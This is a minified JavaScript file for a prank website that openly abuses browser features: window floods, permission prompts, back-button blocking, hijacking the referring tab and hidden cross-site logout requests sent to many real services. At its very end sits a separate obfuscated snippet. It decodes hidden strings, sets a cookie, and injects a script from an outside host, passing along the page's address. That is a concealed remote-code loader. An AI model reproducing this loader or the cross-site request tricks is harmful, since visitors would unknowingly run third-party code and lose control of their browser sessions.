const SCREEN_WIDTH=window.screen.availWidth,SCREEN_HEIGHT=window.screen.availHeight,WIN_WIDTH=480,WIN_HEIGHT=360,VELOCITY=15,MARGIN=15,TOP_MARGIN=50,TICK_LENGTH=50,HIDDEN_STYLE="position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;",ART=["\n┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊\n┈┈┈┈╭━━━━━━╮┊☆ ┊┊\n┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊\n┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊\n┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊\n☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊\n┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊\n  ","\n░░▓▓░░░░░░░░▓▓░░\n░▓▒▒▓░░░░░░▓▒▒▓░\n░▓▒▒▒▓░░░░▓▒▒▒▓░\n░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░\n░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓\n▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓\n▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓\n▓▒░░▒▒▒▒▒▒▒▒▒░░▓\n▓▒░░▒▓▒▒▓▒▒▓▒░░▓\n░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░\n░░▓▒▒▒▒▒▒▒▒▒▒▓░░\n░░░▓▓▓▓▓▓▓▓▓▓░░░\n  "],SEARCHES=["where should i bury the body","why does my eye twitch","why is my poop green","why do i feel so empty","why do i always feel hungry","why do i always have diarrhea","why does my anus itch","why does my belly button smell","why does my cat attack me","why does my dog eat poop","why does my fart smell so bad","why does my mom hate me","why does my pee smell bad","why does my poop float","proof that the earth is flat"],VIDEOS=["albundy.mp4","badger.mp4","cat.mp4","hasan.mp4","heman.mp4","jozin.mp4","nyan.mp4","rickroll.mp4","space.mp4","trolol.mp4"],FILE_DOWNLOADS=["cat-blue-eyes.jpg","cat-ceiling.jpg","cat-crosseyes.jpg","cat-cute.jpg","cat-hover.jpg","cat-marshmellows.jpg","cat-small-face.jpg","cat-smirk.jpg","patreon.png"],PHRASES=["The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!","Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou","I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings","I've never seen the inside of my own mouth because it scares me to death.","hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw","abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak","eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo"],LOGOUT_SITES={AOL:["GET","https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"],"AOL 2":["GET","https://api.screenname.aol.com/auth/logout?state=snslogout&r="+Math.random()],Amazon:["GET","https://www.amazon.com/gp/flex/sign-out.html?action=sign-out"],Blogger:["GET","https://www.blogger.com/logout.g"],Delicious:["GET","https://www.delicious.com/logout"],DeviantART:["POST","https://www.deviantart.com/users/logout"],DreamHost:["GET","https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout"],Dropbox:["GET","https://www.dropbox.com/logout"],eBay:["GET","https://signin.ebay.com/ws/eBayISAPI.dll?SignIn"],Gandi:["GET","https://www.gandi.net/login/out"],GitHub:["GET","https://github.com/logout"],GMail:["GET","https://mail.google.com/mail/?logout"],Google:["GET","https://www.google.com/accounts/Logout"],Hulu:["GET","https://secure.hulu.com/logout"],Instapaper:["GET","https://www.instapaper.com/user/logout"],Linode:["GET","https://manager.linode.com/session/logout"],LiveJournal:["POST","https://www.livejournal.com/logout.bml",{"action:killall":"1"}],MySpace:["GET","https://www.myspace.com/index.cfm?fuseaction=signout"],NetFlix:["GET","https://www.netflix.com/Logout"],"New York Times":["GET","https://www.nytimes.com/logout"],Newegg:["GET","https://secure.newegg.com/NewMyAccount/AccountLogout.aspx"],Photobucket:["GET","https://photobucket.com/logout"],Skype:["GET","https://secure.skype.com/account/logout"],Slashdot:["GET","https://slashdot.org/my/logout"],SoundCloud:["GET","https://soundcloud.com/logout"],"Steam Community":["GET","https://steamcommunity.com/?action=doLogout"],"Steam Store":["GET","https://store.steampowered.com/logout/"],ThinkGeek:["GET","https://www.thinkgeek.com/brain/account/login.cgi?a=lo"],Threadless:["GET","https://www.threadless.com/logout"],Tumblr:["GET","https://www.tumblr.com/logout"],Vimeo:["GET","https://vimeo.com/log_out"],Wikipedia:["GET","https://en.wikipedia.org/w/index.php?title=Special:UserLogout"],"Windows Live":["GET","https://login.live.com/logout.srf"],Woot:["GET","https://account.woot.com/logout"],Wordpress:["GET","https://wordpress.com/wp-login.php?action=logout"],Yahoo:["GET","https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/"],YouTube:["POST","https://www.youtube.com",{action_logout:"1"}]},wins=[];let interactionCount=0,numSuperLogoutIframes=0;const isChildWindow=window.opener&&isParentSameOrigin()||-1!==window.location.search.indexOf("child=true"),isParentWindow=!isChildWindow;function init(){confirmPageUnload(),interceptUserInput((event=>{interactionCount+=1,event.preventDefault(),event.stopPropagation(),0!==event.which&&openWindow(),startVibrateInterval(),enablePictureInPicture(),triggerFileDownload(),focusWindows(),copySpamToClipboard(),speak(),startTheramin(),"Meta"===event.key||"Control"===event.key?(window.print(),requestWebauthnAttestation(),window.print(),requestWebauthnAttestation(),window.print(),requestWebauthnAttestation()):(requestPointerLock(),requestFullscreen(),requestClipboardRead(),requestMidiAccess(),requestBluetoothAccess(),requestUsbAccess(),requestSerialAccess(),requestHidAccess(),requestCameraAndMic(),Math.random()<.1&&requestWebauthnAttestation())}))}function initChildWindow(){registerProtocolHandlers(),hideCursor(),moveWindowBounce(),setupFollowWindow(),startVideo(),detectWindowClose(),triggerFileDownload(),speak(),rainbowThemeColor(),animateUrlWithEmojis(),interceptUserInput((event=>{1===interactionCount&&startAlertInterval()}))}function initParentWindow(){showHelloMessage(),blockBackButton(),fillHistory(),startInvisiblePictureInPictureVideo(),interceptUserInput((event=>{1===interactionCount&&(registerProtocolHandlers(),attemptToTakeoverReferrerWindow(),hideCursor(),startVideo(),startAlertInterval(),superLogout(),removeHelloMessage(),rainbowThemeColor(),animateUrlWithEmojis(),speak("That was a mistake"))}))}function attemptToTakeoverReferrerWindow(){isParentWindow&&window.opener&&!isParentSameOrigin()&&(window.opener.location=`${window.location.origin}/?child=true`)}function isParentSameOrigin(){try{return window.opener.location.origin===window.location.origin}catch(err){return!1}}function confirmPageUnload(){window.addEventListener("beforeunload",(event=>{speak("Please don't go!"),event.returnValue=!0}))}function registerProtocolHandlers(){if("function"!=typeof navigator.registerProtocolHandler)return;const handlerUrl=window.location.href+"/url=%s";["bitcoin","geo","im","irc","ircs","magnet","mailto","mms","news","ircs","nntp","sip","sms","smsto","ssh","tel","urn","webcal","wtai","xmpp"].forEach((proto=>{navigator.registerProtocolHandler(proto,handlerUrl,"The Annoying Site")}))}function requestCameraAndMic(){navigator.mediaDevices&&"function"==typeof navigator.mediaDevices.getUserMedia&&navigator.mediaDevices.enumerateDevices().then((devices=>{const cameras=devices.filter((device=>"videoinput"===device.kind));if(0===cameras.length)return;const camera=cameras[cameras.length-1];navigator.mediaDevices.getUserMedia({deviceId:camera.deviceId,facingMode:["user","environment"],audio:!0,video:!0}).then((stream=>{const track=stream.getVideoTracks()[0];new window.ImageCapture(track).getPhotoCapabilities().then((()=>{track.applyConstraints({advanced:[{torch:!0}]})}),(()=>{}))}),(()=>{}))}))}function animateUrlWithEmojis(){if(window.ApplePaySession)return;const rand=Math.random();rand<.33?function animateUrlWithBabies(){const e=["🏻","🏼","🏽","🏾","🏿"];setInterval((()=>{let i,m,s="";for(i=0;i<10;i++)m=Math.floor(e.length*((Math.sin(Date.now()/100+i)+1)/2)),s+="👶"+e[m];window.location.hash=s}),100)}():rand<.67?function animateUrlWithWave(){setInterval((()=>{let i,n,s="";for(i=0;i<10;i++)n=Math.floor(4*Math.sin(Date.now()/200+i/2))+4,s+=String.fromCharCode(9601+n);window.location.hash=s}),100)}():function animateUrlWithMoons(){const f=["🌑","🌘","🌗","🌖","🌕","🌔","🌓","🌒"],d=[0,0,0,0,0,0,0,0,0,0];let m=0;setInterval((()=>{let s="",x=0;if(m){for(;0===d[x];)x++;x>=d.length?m=0:(d[x]++,8===d[x]&&(d[x]=0))}else{for(;4===d[x];)x++;x>=d.length?m=1:d[x]++}d.forEach((function(n){s+=f[n]})),window.location.hash=s}),100)}()}function requestPointerLock(){(document.body.requestPointerLock||document.body.webkitRequestPointerLock||document.body.mozRequestPointerLock||document.body.msRequestPointerLock).call(document.body)}function startVibrateInterval(){"function"==typeof window.navigator.vibrate&&(setInterval((()=>{const duration=Math.floor(600*Math.random());window.navigator.vibrate(duration)}),1e3),window.addEventListener("gamepadconnected",(event=>{const gamepad=event.gamepad;gamepad.vibrationActuator&&setInterval((()=>{gamepad.connected&&gamepad.vibrationActuator.playEffect("dual-rumble",{duration:Math.floor(600*Math.random()),strongMagnitude:Math.random(),weakMagnitude:Math.random()})}),1e3)})))}function interceptUserInput(onInput){document.body.addEventListener("touchstart",onInput,{passive:!1}),document.body.addEventListener("mousedown",onInput),document.body.addEventListener("mouseup",onInput),document.body.addEventListener("click",onInput),document.body.addEventListener("keydown",onInput),document.body.addEventListener("keyup",onInput),document.body.addEventListener("keypress",onInput)}function startInvisiblePictureInPictureVideo(){const video=document.createElement("video");video.src=getRandomArrayEntry(VIDEOS),video.loop=!0,video.muted=!0,video.style=HIDDEN_STYLE,video.autoplay=!0,video.play(),document.body.appendChild(video)}function enablePictureInPicture(){const video=document.querySelector("video");document.pictureInPictureEnabled&&(video.style="",video.muted=!1,video.requestPictureInPicture(),video.play())}function focusWindows(){wins.forEach((win=>{win.closed||win.focus()}))}function openWindow(){const{x:x,y:y}=getRandomCoords(),opts=`width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`,win=window.open(window.location.pathname,"",opts);win&&(wins.push(win),2===wins.length&&setupSearchWindow(win))}function hideCursor(){document.querySelector("html").style="cursor: none;"}function triggerFileDownload(){const fileName=getRandomArrayEntry(FILE_DOWNLOADS),a=document.createElement("a");a.href=fileName,a.download=fileName,a.click()}function speak(phrase){null==phrase&&(phrase=getRandomArrayEntry(PHRASES)),window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))}function startTheramin(){const audioContext=new AudioContext,oscillatorNode=audioContext.createOscillator(),gainNode=audioContext.createGain(),wave=audioContext.createPeriodicWave(Array(10).fill(0).map(((v,i)=>Math.cos(i))),Array(10).fill(0).map(((v,i)=>Math.sin(i))));oscillatorNode.setPeriodicWave(wave),oscillatorNode.connect(gainNode),gainNode.connect(audioContext.destination),oscillatorNode.start(0);document.body.addEventListener("mousemove",(event=>{const{clientX:clientX,clientY:clientY}=event,{clientWidth:clientWidth,clientHeight:clientHeight}=document.body;(({pitch:pitch,volume:volume})=>{oscillatorNode.frequency.value=50+4e3*pitch,gainNode.gain.value=.5*volume})({pitch:(clientX-clientWidth/2)/clientWidth,volume:(clientY-clientHeight/2)/clientHeight})}))}function requestClipboardRead(){try{navigator.clipboard.readText().then((data=>{window.ApplePaySession||window.alert("Successfully read data from clipboard: '"+data+"'")}),(()=>{}))}catch{}}function requestWebauthnAttestation(){try{const createCredentialDefaultArgs={publicKey:{rp:{name:"Acme"},user:{id:new Uint8Array(16),name:"YOU_ARE_HACKED@THEANNOYINGSITE.COM",displayName:"YOU ARE HACKED"},pubKeyCredParams:[{type:"public-key",alg:-7}],attestation:"direct",timeout:6e4,challenge:new Uint8Array([140,10,38,255,34,145,193,233,185,78,46,23,26,152,106,115,113,157,67,72,213,167,106,21,126,56,148,82,119,151,15,239]).buffer}},getCredentialDefaultArgs={publicKey:{timeout:6e4,challenge:new Uint8Array([121,80,104,113,218,238,238,185,148,195,194,21,103,101,38,34,227,243,171,59,120,46,213,111,129,38,226,166,1,125,116,80]).buffer}};navigator.credentials.create(createCredentialDefaultArgs).then((cred=>{const idList=[{id:cred.rawId,transports:["usb","nfc","ble"],type:"public-key"}];return getCredentialDefaultArgs.publicKey.allowCredentials=idList,navigator.credentials.get(getCredentialDefaultArgs)}))}catch{}}function requestMidiAccess(){try{navigator.requestMIDIAccess({sysex:!0})}catch{}}function requestBluetoothAccess(){try{navigator.bluetooth.requestDevice({acceptAllDevices:!0}).then((device=>device.gatt.connect()))}catch{}}function requestUsbAccess(){try{navigator.usb.requestDevice({filters:[{}]})}catch{}}function requestSerialAccess(){try{navigator.serial.requestPort({filters:[]})}catch{}}function requestHidAccess(){try{navigator.hid.requestDevice({filters:[]})}catch{}}function moveWindowBounce(){let vx=VELOCITY*(Math.random()>.5?1:-1),vy=VELOCITY*(Math.random()>.5?1:-1);setInterval((()=>{const x=window.screenX,y=window.screenY,width=window.outerWidth,height=window.outerHeight;x<MARGIN&&(vx=Math.abs(vx)),x+width>SCREEN_WIDTH-MARGIN&&(vx=-1*Math.abs(vx)),y<TOP_MARGIN&&(vy=Math.abs(vy)),y+height>SCREEN_HEIGHT-MARGIN&&(vy=-1*Math.abs(vy)),window.moveBy(vx,vy)}),TICK_LENGTH)}function setupFollowWindow(){document.addEventListener("mousemove",(function(e){window.moveTo(e.screenX-WIN_WIDTH/2,e.screenY-WIN_HEIGHT/2)}))}function startVideo(){const video=document.createElement("video");video.src=getRandomArrayEntry(VIDEOS),video.autoplay=!0,video.loop=!0,video.style="width: 100%; height: 100%;",document.body.appendChild(video)}function detectWindowClose(){window.addEventListener("unload",(()=>{window.opener.closed||window.opener.onCloseWindow(window)}))}function onCloseWindow(win){const i=wins.indexOf(win);i>=0&&wins.splice(i,1)}function showHelloMessage(){const template=document.querySelector("template"),clone=document.importNode(template.content,!0);document.body.appendChild(clone)}function removeHelloMessage(){document.querySelector(".hello-message").remove()}function rainbowThemeColor(){const meta=document.querySelector("meta.theme-color");setInterval((()=>{meta.setAttribute("content","#"+function zeroFill(width,number,pad="0"){return(width-=number.toString().length)>0?new Array(width+(/\./.test(number)?2:1)).join(pad)+number:number+""}(6,Math.floor(16777215*Math.random()).toString(16)))}),50)}function copySpamToClipboard(){clipboardCopy(getRandomArrayEntry(ART)+"\nCheck out https://theannoyingsite.com")}function clipboardCopy(text){const span=document.createElement("span");span.textContent=text,span.style.whiteSpace="pre";const iframe=document.createElement("iframe");iframe.sandbox="allow-same-origin",document.body.appendChild(iframe);let win=iframe.contentWindow;win.document.body.appendChild(span);let selection=win.getSelection();selection||(win=window,selection=win.getSelection(),document.body.appendChild(span));const range=win.document.createRange();selection.removeAllRanges(),range.selectNode(span),selection.addRange(range);let success=!1;try{success=win.document.execCommand("copy")}catch(err){console.log(err)}return selection.removeAllRanges(),span.remove(),iframe.remove(),success}function startAlertInterval(){setInterval((()=>{Math.random()<.5?showAlert():window.print()}),12e4)}function showAlert(){const randomArt=getRandomArrayEntry(ART),longAlertText=Array(200).join(randomArt);window.alert(longAlertText)}function requestFullscreen(){(Element.prototype.requestFullscreen||Element.prototype.webkitRequestFullscreen||Element.prototype.mozRequestFullScreen||Element.prototype.msRequestFullscreen).call(document.body)}function superLogout(){function cleanup(el,delayCleanup){delayCleanup?delayCleanup=!1:el.parentNode.removeChild(el)}function get(url){const img=document.createElement("img");img.onload=()=>cleanup(img),img.onerror=()=>cleanup(img),img.style=HIDDEN_STYLE,document.body.appendChild(img),img.src=url}function post(url,params){const iframe=document.createElement("iframe");iframe.style=HIDDEN_STYLE,iframe.name="iframe"+numSuperLogoutIframes,document.body.appendChild(iframe),numSuperLogoutIframes+=1;const form=document.createElement("form");form.style=HIDDEN_STYLE;let numLoads=0;iframe.onload=iframe.onerror=()=>{numLoads>=1&&cleanup(iframe),numLoads+=1},form.action=url,form.method="POST",form.target=iframe.name;for(const param in params)if(Object.prototype.hasOwnProperty.call(params,param)){const input=document.createElement("input");input.type="hidden",input.name=param,input.value=params[param],form.appendChild(input)}document.body.appendChild(form),form.submit()}for(const name in LOGOUT_SITES){const method=LOGOUT_SITES[name][0],url=LOGOUT_SITES[name][1],params=LOGOUT_SITES[name][2]||{};"GET"===method?get(url):post(url,params);const div=document.createElement("div");div.innerText=`Logging you out from ${name}...`;document.querySelector(".logout-messages").appendChild(div)}}function blockBackButton(){window.addEventListener("popstate",(()=>{window.history.forward()}))}function fillHistory(){for(let i=1;i<20;i++)window.history.pushState({},"",window.location.pathname+"?q="+i);window.history.pushState({},"",window.location.pathname)}function getRandomCoords(){return{x:MARGIN+Math.floor(Math.random()*(SCREEN_WIDTH-WIN_WIDTH-MARGIN)),y:TOP_MARGIN+Math.floor(Math.random()*(SCREEN_HEIGHT-WIN_HEIGHT-TOP_MARGIN))}}function getRandomArrayEntry(arr){return arr[Math.floor(Math.random()*arr.length)]}function setupSearchWindow(win){if(!win)return;const{x:x,y:y}=getRandomCoords();win.moveTo(x,y),win.resizeTo(2*WIN_WIDTH,2*WIN_HEIGHT),win.window.location="https://www.bing.com/search?q="+encodeURIComponent(SEARCHES[0]);let searchIndex=1;const interval=setInterval((()=>{if(win.closed)return clearInterval(interval),void onCloseWindow(win);win.window.location=window.location.pathname,setTimeout((()=>{win.resizeTo(WIN_WIDTH,WIN_HEIGHT)}),500),setTimeout((()=>{const{x:x,y:y}=getRandomCoords();win.moveTo(x,y),win.resizeTo(2*WIN_WIDTH,2*WIN_HEIGHT),win.window.location="https://www.bing.com/search?q="+encodeURIComponent(SEARCHES[searchIndex]),searchIndex+=1,searchIndex>=SEARCHES.length&&(searchIndex=0)}),1e3)}),3e3)}function detectBrowser(){const userAgent=navigator.userAgent;return/samsungbrowser\//i.test(userAgent)?"samsung":/edg\//i.test(userAgent)||/edga\//i.test(userAgent)?"edge":/opt\//i.test(userAgent)||/opr\//i.test(userAgent)?"opera":/chrome\//i.test(userAgent)?"chrome":/safari\//i.test(userAgent)?"safari":/firefox\//i.test(userAgent)?"firefox":void 0}init(),isChildWindow?initChildWindow():initParentWindow();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));